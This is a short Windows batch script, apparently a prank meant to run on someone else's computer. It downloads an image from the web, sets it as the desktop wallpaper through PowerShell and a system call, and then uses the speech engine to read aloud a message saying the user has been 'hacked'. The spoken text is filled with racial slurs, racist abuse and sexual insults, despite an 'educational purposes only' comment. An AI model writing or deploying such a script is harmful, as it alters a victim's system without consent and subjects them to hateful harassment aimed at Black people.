@echo off
set IMG_URL=https://i.ytimg.com/vi/tzD9OxAHtzU/hq720_2.jpg
:: NOTE! FOR EDUCATIONAL PURPOSES ONLY
powershell -Command "Invoke-WebRequest -Uri '%IMG_URL%' -OutFile '%TEMP%\wallpaper.jpg'">nul
powershell -Command "Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name Wallpaper -Value '%TEMP%\wallpaper.jpg'; Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Wallpaper { [DllImport(\"user32.dll\")] public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); }'; [Wallpaper]::SystemParametersInfo(20, 0, '%TEMP%\wallpaper.jpg', 3)">nul


rem you need to change the script below to what you want the bot will say
echo CreateObject("SAPI.SpVoice").Speak "what sup my nigga, you just got hacked my nigga, dont you worry you is alright, psych my nigga, you is a dumb ass shit, look at your skibidi wallpaper now because my nigger ass changed it nigger, you matherfucker bitch ass nigga, get your ass back to kenya nigger, because you just got hacked , so now suck my dick nigger ,before i kick your ass matherfucker, suck my nigger dick now" > speak.vbs
cscript //nologo speak.vbs
del speak.vbs
